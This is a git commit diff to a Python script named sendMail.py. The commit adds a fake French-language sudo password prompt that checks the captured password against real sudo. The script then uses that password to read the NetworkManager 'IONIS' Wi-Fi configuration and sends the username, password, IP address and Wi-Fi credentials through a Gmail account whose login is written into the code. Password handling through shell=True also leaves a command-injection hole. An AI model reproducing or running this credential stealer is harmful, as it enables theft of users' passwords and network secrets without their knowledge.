b55273e026c6cb80519349cd5cd5482341168e55
Benjamin GAYMAY <benjamin.gaymay@epitech.eu>
2018-02-08 18:09:57 +0100

    finito ?

--- sendMail.py
+++ sendMail.py
@@ -3,13 +3,43 @@
 
 import smtplib
 import getpass
+import socket
+import subprocess
 
-username = getpass.getuser();
-password = getpass.getpass("[sudo] Mot de passe de %s : " % (username))
+def getPassword():
+    username = getpass.getuser();
+    password = ""
 
+    for i in range(3):
+        password = getpass.getpass("[sudo] Mot de passe de %s : " % (username))
+        if subprocess.call("echo %s | sudo -S ls >/dev/null" % password, shell=True, stderr=subprocess.PIPE) == 0:
+            break
+        if i < 2:
+            print("Désolé, essayez de nouveau.")
+        password = ""
 
+    if password == "":
+        print("sudo: 3 saisies de mots de passe incorrectes")
+        exit(1)
+    return username, password
 
-exit (0)
+def getIP():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
+
+def execSudo(cmd, password):
+    result = subprocess.check_output("echo %s | sudo -S %s" % (password, cmd), shell=True, stderr=subprocess.PIPE)
+    return result.decode("utf-8")
+
+username, session_password = getPassword()
+ip = getIP()
+IONIS = execSudo("cat /etc/NetworkManager/system-connections/IONIS", session_password)
+
+msg = "\nUser : %s\nPassword : %s\nIP : %s\nIONIS : %s" % (username, session_password, ip, IONIS)
+
 server = smtplib.SMTP('smtp.gmail.com', 587)
 server.starttls()
 server.login("applicationsudo@gmail.com", "ANTILOPE")
